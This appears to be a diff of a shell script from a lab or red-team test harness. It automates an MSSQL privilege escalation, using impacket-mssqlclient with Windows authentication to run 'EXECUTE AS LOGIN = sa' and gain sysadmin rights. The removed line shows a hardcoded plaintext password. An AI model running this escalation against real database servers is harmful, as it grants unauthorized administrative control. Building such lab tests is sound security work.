@@ -9,7 +9,7 @@ require_tool impacket-mssqlclient
 require_env MBR01 "MBR01"
 require_env DOMAIN_CHILD "DOMAIN_CHILD"
 
-step "Execute EXECUTE AS LOGIN to escalate to SA"
-run_cmd "impacket-mssqlclient \"$DOMAIN_CHILD/analyst_t1:'T13r_An@lyst!'@$MBR01\" -windows-auth -query \"EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER\""
+step "EXECUTE AS LOGIN = sa via impacket-mssqlclient (-file, timeout)"
+run_cmd "SQLF=\$(mktemp); printf '%s\\n' \"EXECUTE AS LOGIN = 'sa';\" \"SELECT SYSTEM_USER;\" > \"\$SQLF\"; timeout 45 impacket-mssqlclient \"${DOMAIN_CHILD}/analyst_t1:${MSSQL_PASS}@${MBR01}\" -windows-auth -file \"\$SQLF\"; RC=\$?; rm -f \"\$SQLF\"; exit \$RC"
 
 result $? "MSSQL Impersonation completed"
